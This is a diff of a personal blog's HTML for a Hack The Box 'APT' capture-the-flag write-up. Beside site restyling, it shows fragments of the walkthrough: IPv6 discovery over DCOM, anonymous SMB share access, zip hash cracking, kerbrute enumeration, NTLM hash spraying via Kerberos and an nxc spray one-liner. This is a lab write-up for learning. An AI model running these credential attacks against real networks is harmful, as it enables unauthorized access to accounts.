@@ -17,12 +17,15 @@
       
       
       
-      <link rel="icon" href="../../../../../../assets/favicon.svg">
+        <link rel="alternate" type="application/rss+xml" title="RSS feed" href="../../../../../../feed_rss_created.xml">
+        <link rel="alternate" type="application/rss+xml" title="RSS feed of updated content" href="../../../../../../feed_rss_updated.xml">
+      
+      <link rel="icon" href="../../../../../../assets/favicon-zero.svg">
       <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.20">
     
     
       
-        <title>APT - b0nyo // Offensive Security</title>
+        <title>APT - b0nyo // Offensive Security Operator</title>
       
     
     
@@ -90,9 +93,9 @@
 
 <header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
   <nav class="md-header__inner md-grid" aria-label="Header">
-    <a href="../../../../../.." title="b0nyo // Offensive Security" class="md-header__button md-logo" aria-label="b0nyo // Offensive Security" data-md-component="logo">
+    <a href="../../../../../.." title="b0nyo // Offensive Security Operator" class="md-header__button md-logo" aria-label="b0nyo // Offensive Security Operator" data-md-component="logo">
       
-  <img src="../../../../../../assets/logo.svg" alt="logo">
+  <img src="../../../../../../assets/demon-head-logo.png" alt="logo">
 
     </a>
     <label class="md-header__button md-icon" for="__drawer">
@@ -103,7 +106,7 @@
       <div class="md-header__ellipsis">
         <div class="md-header__topic">
           <span class="md-ellipsis">
-            b0nyo // Offensive Security
+            b0nyo // Offensive Security Operator
           </span>
         </div>
         <div class="md-header__topic" data-md-component="header-topic">
@@ -197,13 +200,13 @@
   
   
     <li class="md-tabs__item">
-      <a href="/#write-ups" class="md-tabs__link">
+      <a href="/#blog" class="md-tabs__link">
         
   
   
     
   
-  Write-ups
+  Blog
 
       </a>
     </li>
@@ -223,6 +226,25 @@
     
   
   CVEs
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="/#write-ups" class="md-tabs__link">
+        
+  
+  
+    
+  
+  Write-ups
 
       </a>
     </li>
@@ -276,12 +298,12 @@
 
 <nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
   <label class="md-nav__title" for="__drawer">
-    <a href="../../../../../.." title="b0nyo // Offensive Security" class="md-nav__button md-logo" aria-label="b0nyo // Offensive Security" data-md-component="logo">
+    <a href="../../../../../.." title="b0nyo // Offensive Security Operator" class="md-nav__button md-logo" aria-label="b0nyo // Offensive Security Operator" data-md-component="logo">
       
-  <img src="../../../../../../assets/logo.svg" alt="logo">
+  <img src="../../../../../../assets/demon-head-logo.png" alt="logo">
 
     </a>
-    b0nyo // Offensive Security
+    b0nyo // Offensive Security Operator
   </label>
   
   <ul class="md-nav__list" data-md-scrollfix>
@@ -315,12 +337,12 @@
   
   
     <li class="md-nav__item">
-      <a href="/#write-ups" class="md-nav__link">
+      <a href="/#blog" class="md-nav__link">
         
   
   
   <span class="md-ellipsis">
-    Write-ups
+    Blog
     
   </span>
   
@@ -343,6 +365,28 @@
   
   <span class="md-ellipsis">
     CVEs
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="/#write-ups" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Write-ups
     
   </span>
   
@@ -695,9 +739,9 @@
 <hr />
 <h2 id="discovering-ipv6-via-dcom-ioxidresolver">Discovering IPv6 via DCOM / IOXIDResolver</h2>
 <p>With only ports 80 and 135 open on IPv4, we know a firewall is blocking standard AD ports (445, 389, 88, etc.). However, <strong>Windows firewalls often forget to filter IPv6</strong>.</p>
-<p>Port 135 always exposes the <strong>IOXIDResolver</strong> interface (<code>99fcfec4-5260-101b-bbcb-00aa0021347a</code>), which is part of the DCOM core. Unlike regular RPC endpoints, IOXIDResolver doesn't register itself in the Endpoint Mapper, it's always available directly on port 135.</p>
+<p>Port 135 always exposes the <strong>IOXIDResolver</strong> interface (<code>99fcfec4-5260-101b-bbcb-00aa0021347a</code>), which is part of the DCOM core. Unlike regular RPC endpoints, IOXIDResolver doesn't register itself in the Endpoint Mapper; it's always available directly on port 135.</p>
 <h4 id="why-doesnt-it-appear-in-rpcdump">Why doesn't it appear in rpcdump?</h4>
-<p>The <code>rpcdump.py</code> tool queries the <strong>Endpoint Mapper (EPM)</strong>, which acts like a directory of registered services. IOXIDResolver is part of the DCOM kernel and never registers there it's always reachable directly.</p>
+<p>The <code>rpcdump.py</code> tool queries the <strong>Endpoint Mapper (EPM)</strong>, which acts like a directory of registered services. IOXIDResolver is part of the DCOM kernel and never registers there — it's always reachable directly.</p>
 <h4 id="how-the-attack-works">How the attack works</h4>
 <p>The <code>ServerAlive2()</code> method of IOXIDResolver is completely unauthenticated and responds with all network interfaces (bindings) of the target, including IPv6 addresses you didn't know existed.</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>python3<span class="w"> </span>IOXIDResolver.py<span class="w"> </span>-t<span class="w"> </span><span class="m">10</span>.129.96.60
@@ -837,7 +881,7 @@
 <a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>SMB<span class="w">         </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span><span class="m">445</span><span class="w">    </span>APT<span class="w">              </span>backup<span class="w">          </span>READ
 <a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>SMB<span class="w">         </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span><span class="m">445</span><span class="w">    </span>APT<span class="w">              </span>IPC$<span class="w">                            </span>Remote<span class="w"> </span>IPC
 <a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>SMB<span class="w">         </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span><span class="m">445</span><span class="w">    </span>APT<span class="w">              </span>NETLOGON<span class="w">                        </span>Logon<span class="w"> </span>server<span class="w"> </span>share
-<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>SMB<span class="w">         </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span><span class="m">445</span><span class="w">    </span>APT<span class="w">              </span>SYSVOL<span class="w">                          </span>Logon<span class="w"> </span>server<span class="w"> </span>share<span class="sb">```</span>
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a>SMB<span class="w">         </span>dead:beef::b885:d62a:d679:573f<span class="w"> </span><span class="m">445</span><span class="w">    </span>APT<span class="w">              </span>SYSVOL<span class="w">                          </span>Logon<span class="w"> </span>server<span class="w"> </span>share
 </code></pre></div>
 <p>Anonymous access is allowed and we have <strong>READ</strong> permission on a <code>backup</code> share. Let's download what's inside.</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>smbclient.py<span class="w"> </span><span class="s1">'htb.local/'</span>:<span class="s1">''</span>@dead:beef::b885:d62a:d679:573f
@@ -856,7 +900,7 @@
 <a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>cat<span class="w"> </span>backup_hash<span class="w"> </span>-p
 <a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>backup.zip:<span class="nv">$pkzip2$3</span>*1*1*0*8*24*9beb*9ac6*0f135e8d5f0&lt;REDACTED_HASH&gt;
 </code></pre></div>
-<p>After clean the hash we cracking the passwd.
+<p>After cleaning up the hash, we crack the password:
 <div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>john backup_hash --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
 <a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>Using default input encoding: UTF-8
 <a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>Loaded 1 password hash (PKZIP [32/64])
@@ -923,7 +967,7 @@
 <p>We found a cleartext password <code>&lt;REDACTED&gt;</code> in the LSA secrets, and 1999 domain user hashes. However, this is a <strong>backup from September 2020</strong> — passwords may have changed since then. We need to figure out which users are still valid.</p>
 <hr />
 <h2 id="user-validation-via-kerbrute">User Validation via Kerbrute</h2>
-<p>We try a password spray with <code>&lt;REDACTED&gt;</code> first,no luck. Since port 88 (Kerberos) is open, we use <code>kerbrute</code> to validate which users from the dump still exist in the domain:</p>
+<p>We try a password spray with <code>&lt;REDACTED&gt;</code> first, but no luck. Since port 88 (Kerberos) is open, we use <code>kerbrute</code> to validate which users from the dump still exist in the domain:</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>./kerbrute_linux_amd64<span class="w"> </span>userenum<span class="w"> </span>-d<span class="w"> </span>htb.local<span class="w"> </span>--dc<span class="w"> </span>apt6.htb<span class="w"> </span>users.txt
 <a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>
 <a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>VALID<span class="w"> </span>USERNAME:<span class="w"> </span>Administrator@htb.local
@@ -943,18 +987,18 @@
 </code></pre></div>
 <p>The hash from 2020 is no longer valid. But here's the key insight: maybe henry.vinson is now using a password that matches another user's hash from the old dump. We extract all 1999 NTLM hashes and spray each one against henry.vinson via Kerberos.
 <strong>Technical Note:</strong> We performed the hash spray via Kerberos Pre-Authentication instead of traditional SMB for two reasons: speed and stealth. Kerberos is significantly faster and often generates less noise in event logs (Event ID 4768 for Kerberos vs Event ID 4625 for SMB). Furthermore, it allows us to validate credentials by simply requesting a TGT, without needing to establish a full connection to the file system (SMB shares).</p>
-<p>Wisp me on LinkedIn if you'd like to check out the script or discuss the logic!</p>
+<p>In a real engagement you wouldn't roll your own for this — <code>nxc smb &lt;dc&gt; -u henry.vinson -H hashes.txt --continue-on-success</code> sprays a hash list in one line, and <a href="https://github.com/ShutdownRepo/smartbrute">smartbrute</a> does it over Kerberos while staying lockout-aware. That last point matters: each wrong hash is a failed pre-authentication that increments <code>badPwdCount</code>, so spraying a large list blindly can lock the target account. Here I wrote a small Impacket PoC purely to understand the Kerberos pre-auth internals — the logic, not the tool, is the takeaway.</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>awk<span class="w"> </span>-F<span class="w"> </span><span class="s2">":"</span><span class="w"> </span><span class="s1">'/^[a-zA-Z0-9._-]+:[0-9]+:/ {print $4}'</span><span class="w"> </span>secretsdump.txt<span class="w"> </span>&gt;<span class="w"> </span>hashes_ntlm.txt
 <a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>
 <a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>python3<span class="w"> </span>spray_henry.py<span class="w"> </span>hashes_ntlm.txt
 <a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>
-<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Probando<span class="w"> </span><span class="m">1999</span><span class="w"> </span>hashes<span class="w"> </span>contra<span class="w"> </span>henry.vinson...
-<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>¡ÉXITO!<span class="w"> </span>Hash<span class="w"> </span>válido<span class="w"> </span>encontrado:<span class="w"> </span>&lt;REDACTED_HASH&gt;
+<a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a><span class="o">[</span>*<span class="o">]</span><span class="w"> </span>Trying<span class="w"> </span><span class="m">1999</span><span class="w"> </span>hashes<span class="w"> </span>against<span class="w"> </span>henry.vinson...
+<a id="__codelineno-16-6" name="__codelineno-16-6" href="#__codelineno-16-6"></a><span class="o">[</span>+<span class="o">]</span><span class="w"> </span>SUCCESS!<span class="w"> </span>Valid<span class="w"> </span><span class="nb">hash</span><span class="w"> </span>found:<span class="w"> </span>&lt;REDACTED_HASH&gt;
 </code></pre></div>
 <p>Henry is reusing the NTLM hash of another user from the old dump. We now have valid credentials for him.</p>
 <hr />
 <h2 id="remote-registry-access-with-regpy">Remote Registry Access with reg.py</h2>
-<p>Henry's hash authenticates against Kerberos, but SMB and WinRM both return Access Denied, he doesn't have interactive login rights. However, there's another avenue: <strong>Remote Registry via RPC</strong>.</p>
+<p>Henry's hash authenticates against Kerberos, but SMB and WinRM both return Access Denied; he doesn't have interactive login rights. However, there's another avenue: <strong>Remote Registry via RPC</strong>.</p>
 <p>Windows administrators often forget to restrict Remote Registry access in GPOs, leaving it open as a way to read persistent configuration. If Henry has ever logged into this machine, his registry hive will be mounted under <code>HKU</code>.</p>
 <div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>reg.py<span class="w"> </span>-hashes<span class="w"> </span>:&lt;REDACTED_HASH&gt;<span class="w"> </span>htb.local/henry.vinson@apt6.htb<span class="w"> </span>query<span class="w"> </span>-keyName<span class="w"> </span><span class="s2">"HKU"</span>
 <a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>Impacket<span class="w"> </span>v0.13.0<span class="w"> </span>-<span class="w"> </span>Copyright<span class="w"> </span>Fortra,<span class="w"> </span>LLC<span class="w"> </span>and<span class="w"> </span>its<span class="w"> </span>affiliated<span class="w"> </span>companies
@@ -1061,7 +1105,7 @@
 <a id="__codelineno-21-48" name="__codelineno-21-48" href="#__codelineno-21-48"></a><span class="n">Administrator</span>            <span class="n">DefaultAccount</span>           <span class="n">Guest</span>
 <a id="__codelineno-21-49" name="__codelineno-21-49" href="#__codelineno-21-49"></a><span class="n">henry</span><span class="p">.</span><span class="n">vinson</span>             <span class="n">henry</span><span class="p">.</span><span class="n">vinson_adm</span>         <span class="n">krbtgt</span>
 </code></pre></div>
-Before jumping into automated tools like BloodHound, I perform a manual "visual dump" of the user's file structure. Often, administrators leave sensitive information or configuration traces in non standard locations.
+Before jumping into automated tools like BloodHound, I perform a manual "visual dump" of the user's file structure. Often, administrators leave sensitive information or configuration traces in non-standard locations.
 <div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">henry</span><span class="p">.</span><span class="n">vinson_adm</span><span class="p">&gt;</span> <span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">c</span> <span class="nb">dir </span><span class="p">/</span><span class="n">S</span> <span class="p">/</span><span class="n">A</span>
 <a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a> <span class="n">Volume</span> <span class="k">in</span> <span class="n">drive</span> <span class="n">C</span> <span class="n">is</span> <span class="n">System</span>
 <a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a> <span class="n">Volume</span> <span class="n">Serial</span> <span class="n">Number</span> <span class="n">is</span> <span class="n">BF99-DE3E</span>
@@ -1227,33 +1271,16 @@ In the other terminal:
   <div class="md-footer-meta md-typeset">
     <div class="md-footer-meta__inner md-grid">
       <div class="md-copyright">Copyright &copy; 2026 Jose Raul Bongiovani</div>
-      
-<div class="md-social">
-  
-    
-    
-    
-    
-    <a href="https://github.com/b0nyo" target="_blank" rel="noopener" title="GitHub" class="md-social__link">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
-    </a>
-  
-    
-    
-    
-    
-    <a href="https://www.linkedin.com/in/jose-raul-bongiovani/" target="_blank" rel="noopener" title="LinkedIn" class="md-social__link">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3M135.4 416H69V202.2h66.5V416zM102.2 96a38.5 38.5 0 1 1 0 77 38.5 38.5 0 1 1 0-77m282.1 320h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9z"/></svg>
-    </a>
-  
-    
-    
-    
-    
-    <a href="https://app.hackthebox.com/users/1117173" target="_blank" rel="noopener" title="Hack The Box" class="md-social__link">
-      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.0.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M224.3-2.5c19.8-11.4 44.2-11.4 64 0L464.2 99c19.8 11.4 32 32.6 32 55.4v203c0 22.9-12.2 44-32 55.4L288.3 514.5a64.16 64.16 0 0 1-64 0L48.5 413c-19.8-11.4-32-32.6-32-55.4v-203c0-22.9 12.2-44 32-55.4zm207.8 360V191.4l-143.8 83v166.1z"/></svg>
-    </a>
-  
+      <div class="md-social">
+  <a class="md-social__link" href="https://github.com/b0nyo" target="_blank" rel="noopener noreferrer" aria-label="GitHub" title="GitHub">
+    <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 .7a11.5 11.5 0 0 0-3.64 22.41c.58.11.79-.25.79-.56v-2.23c-3.22.7-3.9-1.37-3.9-1.37-.52-1.34-1.28-1.69-1.28-1.69-1.05-.72.08-.71.08-.71 1.16.08 1.77 1.19 1.77 1.19 1.03 1.77 2.7 1.26 3.36.96.1-.75.4-1.26.73-1.55-2.57-.29-5.27-1.28-5.27-5.69 0-1.26.45-2.28 1.19-3.09-.12-.29-.52-1.47.11-3.05 0 0 .97-.31 3.16 1.18A10.97 10.97 0 0 1 12 6.11c.98 0 1.96.13 2.88.39 2.2-1.49 3.16-1.18 3.16-1.18.63 1.58.23 2.76.11 3.05.74.81 1.19 1.83 1.19 3.09 0 4.42-2.71 5.39-5.29 5.68.42.36.79 1.06.79 2.14v3.27c0 .31.21.68.8.56A11.5 11.5 0 0 0 12 .7Z"/></svg>
+  </a>
+  <a class="md-social__link" href="https://www.linkedin.com/in/jose-raul-bongiovani/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn" title="LinkedIn">
+    <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M5.37 3.2a2.18 2.18 0 1 1 0 4.36 2.18 2.18 0 0 1 0-4.36ZM3.49 9.18h3.76V21H3.49V9.18Zm5.95 0h3.6v1.62h.05c.5-.95 1.73-1.95 3.56-1.95 3.81 0 4.52 2.51 4.52 5.78V21h-3.75v-5.65c0-1.35-.03-3.08-1.88-3.08-1.88 0-2.17 1.47-2.17 2.98V21H9.44V9.18Z"/></svg>
+  </a>
+  <a class="md-social__link" href="https://app.hackthebox.com/users/1117173" target="_blank" rel="noopener noreferrer" aria-label="Hack The Box" title="Hack The Box">
+    <svg viewBox="0 0 24 24" aria-hidden="true"><path d="M12 2 21 7v10l-9 5-9-5V7l9-5Zm0 2.3L5.1 8.1v7.8l5.9 3.28v-6.6L5.2 9.35l1.07-1.92L12 10.62l5.73-3.19 1.07 1.92L13 12.58v6.6l5.9-3.28V8.1L12 4.3Z"/></svg>
+  </a>
 </div>
     </div>
   </div>
